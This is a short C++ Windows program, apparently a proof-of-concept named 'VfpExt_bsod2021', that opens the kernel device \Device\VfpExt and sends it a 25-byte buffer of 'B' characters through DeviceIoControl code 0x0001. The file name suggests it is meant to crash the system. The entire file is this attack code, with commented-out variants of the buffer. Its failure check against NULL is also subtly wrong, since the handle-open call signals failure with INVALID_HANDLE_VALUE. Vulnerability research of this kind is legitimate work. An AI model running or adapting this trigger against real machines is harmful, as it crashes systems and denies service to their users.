// vfpext_test00.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

// VfpExt_bsod2021.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#pragma comment(lib, "ntdll")

#include <cstdio>
#include <windows.h>
#include <Windows.h>
#include <stdio.h>
#include <Psapi.h>

int main() {
    HANDLE hVfpExt = CreateFileA("\\\\.\\GLOBALROOT\\Device\\VfpExt",
        GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

    if (hVfpExt == NULL) {
        printf("[-] Failed to open \\Device\\VfpExt: %u\n", GetLastError());
        return 1;
    }

    printf("[+] \\Device\\VfpExt opened, handle: %p\n", hVfpExt);

    CONST DWORD DataBufferSize = 25;
    DWORD input_buffer_size = 25;
    char* input_buffer = (char*)VirtualAlloc(NULL, (SIZE_T)input_buffer_size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    RtlFillMemory(input_buffer, input_buffer_size, 'B');
    
    //RtlZeroMemory(input_buffer, input_buffer_size);

    //*(DWORD*)&input_buffer[0x00] = 'A';
    //*(DWORD*)&input_buffer[0x01] = 'A';
    //*(DWORD*)&input_buffer[0xF] = 'A';

    //RtlCopyMemory(&IoctlData[0x200], L"FUNCTION", 0x12);
    //RtlCopyMemory(&IoctlData[0x400], L"PROPERTY", 0x12);

    ULONG_PTR OutputBuffer = 0;
    DWORD BytesReturned;
    BOOL Status = DeviceIoControl(
        hVfpExt,
        0x0001,
        input_buffer,
        input_buffer_size,
        &OutputBuffer,
        sizeof(OutputBuffer),
        &BytesReturned,
        NULL
    );

    printf("[+] Ioctl sent, Status: %d, OutputBuffer: %zx\n", Status, OutputBuffer);

    CloseHandle(hVfpExt);

    return 0;
}
